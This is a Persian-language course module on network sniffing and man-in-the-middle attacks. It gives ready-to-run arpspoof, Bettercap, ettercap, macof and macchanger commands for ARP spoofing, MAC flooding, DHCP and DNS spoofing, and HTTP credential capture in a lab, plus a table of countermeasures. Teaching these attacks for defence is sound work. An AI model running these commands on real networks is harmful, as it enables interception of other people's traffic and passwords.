# شنود (Sniffing)

**مدت یادگیری**: ۴ ساعت
**سطح سختی**: متوسط
**پیش‌نیاز**: فایل ۰۲ (شبکه) و ۰۵ (اسکن)

---

## فهرست محتوا

- [فصل ۱: مقدمه شنود](#فصل-۱-مقدمه-شنود)
- [فصل ۲: Wireshark و tcpdump](#فصل-۲-wireshark-و-tcpdump)
- [فصل ۳: ARP Spoofing و MITM](#فصل-۳-arp-spoofing-و-mitm)
- [فصل ۴: حملات لایه ۲](#فصل-۴-حملات-لایه-۲)
- [فصل ۵: آزمایشگاه و اقدامات متقابل](#فصل-۵-آزمایشگاه-و-اقدامات-متقابل)

---

## فصل ۱: مقدمه شنود

### مقدمه

**Sniffing (شنود)** یعنی رهگیری و تحلیل ترافیک شبکه. در شبکه‌های بدون رمزنگاری، اطلاعات حساس (رمز، کوکی، پیام) قابل خواندن است.

> **تشبیه:** شنود مثل ایستادن کنار خط تلفن و گوش دادن به مکالمه است.

### مفاهیم اساسی

**دو نوع شنود:**
- **Passive Sniffing:** فقط گوش دادن (در هاب یا Wi-Fi). غیرقابل تشخیص.
- **Active Sniffing:** ارسال بسته برای هدایت ترافیک (در سوئیچ). قابل تشخیص.

**چرا سوئیچ مشکل است؟** سوئیچ ترافیک را فقط به پورت مقصد می‌فرستد. برای شنود، باید **Port Mirroring (SPAN)** یا **ARP Spoofing** انجام دهیم.

**پروتکل‌های آسیب‌پذیر (بدون رمز):** HTTP، FTP، Telnet، SMTP، POP3، SNMPv1/v2.

### نکات مهم (Tips & Tricks)

- **HTTPS، SSH، VPN** ترافیک را رمز می‌کنند و شنود را بی‌اثر می‌کنند.
- **Passive Sniffing** فقط در شبکه‌های هاب یا Wi-Fi مشترک مؤثر است.
- برای شنود در سوئیچ، از **MAC Flooding** یا **ARP Spoofing** استفاده کنید.

### خلاصه فصل

- Sniffing = رهگیری ترافیک.
- Passive (پسیو) vs Active (اکتیو).
- رمزنگاری بهترین دفاع است.

---

## فصل ۲: Wireshark و tcpdump

### مقدمه

**Wireshark** قدرتمندترین تحلیل‌گر ترافیک (GUI) و **tcpdump** معادل خط فرمان آن است.

### مفاهیم اساسی

**Wireshark:**
- Capture: انتخاب رابط و شروع.
- Filter (نمایش): `http`, `ip.addr==1.2.3.4`, `tcp.port==80`.
- Follow Stream: دنبال کردن یک مکالمه کامل.
- Statistics: آمار پروتکل‌ها و مکالمات.

**tcpdump:**
- `-i` رابط، `-w` ذخیره، `-r` خواندن، `-n` بدون ترجمه DNS.
- فیلتر BPF: `port 80`, `host 1.2.3.4`, `tcp`.

### مثال عملی

```bash
# --- tcpdump ---
sudo tcpdump -i eth0 -n
sudo tcpdump -i eth0 port 80 -w http.pcap
sudo tcpdump -r http.pcap
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'   # فقط SYN
sudo tcpdump -i eth0 host 192.168.56.101 and port 22

# --- Wireshark (خط فرمان) ---
sudo tshark -i eth0 -f "port 80"
tshark -r http.pcap -Y "http.request" -T fields -e http.host
```

**فیلترهای نمایش مهم Wireshark:**
```
http.request.method == "POST"
ip.src == 192.168.56.10 && tcp.port == 80
tcp.flags.syn == 1
dns.qry.name contains "example"
```

### اشکال شایع

- **مشکل:** هیچ بسته‌ای دیده نمی‌شود → رابط اشتباه یا مشکل مجوز (`sudo`).
- **مشکل:** ترافیک رمزشده خوانا نیست → HTTPS/TLS؛ به دنبال کلید یا محتوای بدون رمز باشید.
- **مشکل:** فایل pcap خیلی بزرگ است → با فیلتر ضبط کنید.

### نکات مهم (Tips & Tricks)

- **Follow > TCP Stream** برای دیدن مکالمه کامل.
- فیلترهای نمایش (`-Y`) با فیلتر ضبط (`-f`) متفاوت‌اند.
- **Statistics > Conversations** برای خلاصه سریع.
- می‌توانید ترافیک را با کلید TLS رمزگشایی کنید (اگر کلید دارید).

### خلاصه فصل

- Wireshark GUI، tcpdump/tshark خط فرمان.
- فیلترها کلید کار مؤثرند.
- Follow Stream برای تحلیل مکالمه.

---

## فصل ۳: ARP Spoofing و MITM

### مقدمه

**ARP Spoofing** تکنیک اصلی **Man-in-the-Middle (MITM)** در شبکه محلی است.

### مفاهیم اساسی

**ARP** IP را به MAC ترجمه می‌کند و **بدون احراز هویت** است — هر کسی می‌تواند پاسخ جعلی بدهد.

**سناریوی MITM:**
```
قربانی ──── «من روتر هستم» ──── مهاجم ──── «من قربانی هستم» ──── روتر
```
مهاجم خود را میان قربانی و روتر قرار می‌دهد و ترافیک را می‌بیند/تغییر می‌دهد.

**ابزارها:** ettercap، arpspoof، Bettercap، mitmproxy.

### مثال عملی

```bash
# === فعال‌سازی IP Forwarding ===
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# === arpspoof ===
sudo arpspoof -i eth0 -t 192.168.56.101 192.168.56.1   # به قربانی: من روترم
sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.101   # به روتر: من قربانی‌ام

# === Bettercap (مدرن‌تر) ===
sudo bettercap -iface eth0
# در محیط bettercap:
# net.probe on
# set arp.spoof.targets 192.168.56.101
# arp.spoof on
# net.sniff on

# === ettercap ===
sudo ettercap -T -i eth0 -M arp:remote /192.168.56.101// /192.168.56.1//
```

### اشکال شایع

- **مشکل:** اینترنت قربانی قطع می‌شود → IP Forwarding را فعال کنید.
- **مشکل:** HTTPS خوانا نیست → برای رمزگشایی به SSL Stripping یا گواهی جعلی نیاز است.
- **مشکل:** بعد از تست، ARP خراب می‌ماند → با `arp -d` یا ریست شبکه بازیابی کنید.

### نکات مهم (Tips & Tricks)

- **Bettercap** مدرن‌ترین و قدرتمندترین ابزار MITM است.
- با **SSLStrip** می‌توان HTTPS را به HTTP تنزل داد (در برابر HSTS شکست می‌خورد).
- **mitmproxy** برای تحلیل و تغییر ترافیک HTTP/S عالی است.
- همیشه بعد از تست، جدول ARP قربانی را بازیابی کنید.

### خلاصه فصل

- ARP Spoofing پایه MITM در شبکه محلی.
- ابزارها: arpspoof، Bettercap، ettercap.
- IP Forwarding ضروری است.

---

## فصل ۴: حملات لایه ۲

### مقدمه

حملات لایه ۲ (Data Link) اغلب نادیده گرفته می‌شوند اما بسیار خطرناک‌اند.

### مفاهیم اساسی

| حمله | توضیح |
|------|-------|
| **MAC Flooding** | پر کردن جدول MAC سوئیچ → تبدیل به هاب |
| **DHCP Spoofing** | راه‌اندازی DHCP جعلی → تخصیص IP مهاجم |
| **VLAN Hopping** | عبور از مرز VLAN |
| **STP Attack** | تصاحب Root Bridge |
| **MAC Spoofing** | جعل آدرس MAC |

### مثال عملی

```bash
# === MAC Flooding ===
sudo macof -i eth0
# یا:
sudo yersinia -I

# === DHCP Spoofing (با Bettercap) ===
sudo bettercap -iface eth0
# set dhcp.spoof on
# dhcp.spoof on

# === MAC Spoofing ===
sudo ip link set dev eth0 down
sudo macchanger -r eth0
sudo ip link set dev eth0 up

# === VLAN Hopping (Switch Spoofing) ===
# با yersinia یا ساخت فریم‌های 802.1Q دوتایی
```

### اشکال شایع

- **مشکل:** macof شبکه را قطع می‌کند → در محیط تست استفاده کنید.
- **مشکل:** Switch جدید مقاوم است → سوئیچ‌های مدرن Port Security دارند.

### نکات مهم (Tips & Tricks)

- **DHCP Snooping** و **Port Security** بهترین دفاع‌ها هستند.
- **Dynamic ARP Inspection (DAI)** جلوی ARP Spoofing را می‌گیرد.
- این حملات در شبکه‌های سازمانی (Campus) رایج‌ترند.

### خلاصه فصل

- MAC Flooding، DHCP Spoofing، VLAN Hopping، STP Attack.
- سوئیچ‌های مدرن با Port Security مقاوم‌ترند.
- DAI و DHCP Snooping دفاع اصلی.

---

## فصل ۵: آزمایشگاه و اقدامات متقابل

### مقدمه

یک آزمایشگاه کامل شنود و MITM بسازیم.

### مثال عملی — آزمایشگاه کامل

```bash
# === پیش‌نیاز ===
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# === ۱. شنود پایه ===
sudo tcpdump -i eth0 -n

# === ۲. MITM با Bettercap ===
sudo bettercap -iface eth0
# net.probe on
# set arp.spoof.targets 192.168.56.101
# set arp.spoof.fullduplex true
# arp.spoof on
# net.sniff on

# === ۳. شکار اطلاعات ورود (HTTP) ===
# در Bettercap: net.sniff.verbose true
# یک ورود HTTP روی هدف انجام دهید و رمز را ببینید

# === ۴. DNS Spoofing ===
# set dns.spoof.domains example.com
# set dns.spoof.address 192.168.56.10
# dns.spoof on

# === ۵. پاکسازی ===
# arp.spoof off
# در قربانی: arp -d  یا ریست شبکه
```

### اشکال شایع

- **مشکل:** اطلاعاتی شکار نمی‌شود → مطمئن شوید ترافیک بدون رمز است.
- **مشکل:** شبکه بعد از تست خراب است → IP Forwarding را خاموش و ARP را ریست کنید.

### نکات مهم (Tips & Tricks)

- **Bettercap** جایگزین مدرن ettercap است.
- **SSLStrip** برای تنزل HTTPS (در برابر HSTS ضعیف).
- همیشه محیط تست را پاکسازی کنید.

### اقدامات متقابل (Countermeasures)

| حمله | راهکار دفاعی |
|------|--------------|
| Passive Sniffing | رمزنگاری (HTTPS، SSH، VPN) |
| ARP Spoofing | Dynamic ARP Inspection، Static ARP |
| MAC Flooding | Port Security |
| DHCP Spoofing | DHCP Snooping |
| VLAN Hopping | غیرفعال‌سازی DTP، تغییر Native VLAN |
| SSL Strip | HSTS، HTTP Strict Transport |

### خلاصه فصل

- آزمایشگاه کامل: شنود → MITM → DNS Spoofing.
- Bettercap ابزار مدرن MITM.
- دفاع: رمزنگاری + DAI + DHCP Snooping.

---

## منابع و مراجع

- **Wireshark:** https://www.wireshark.org/
- **tcpdump:** https://www.tcpdump.org/
- **Bettercap:** https://www.bettercap.org/
- **Ettercap:** https://www.ettercap-project.org/
- **mitmproxy:** https://mitmproxy.org/
- **macchanger:** https://github.com/alobbs/macchanger
- **Yersinia:** https://github.com/r00t-3xp10it/yersinia
